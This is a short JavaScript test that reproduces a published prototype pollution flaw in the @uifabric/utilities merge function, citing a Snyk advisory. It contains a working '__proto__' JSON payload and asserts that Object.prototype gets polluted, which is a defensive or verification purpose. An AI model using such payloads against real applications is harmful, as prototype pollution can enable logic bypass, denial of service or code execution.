//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
test("prototype pollution in @uifabric/utilities ", () => {
  const util = require("@uifabric/utilities");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  const source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  y = util.merge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
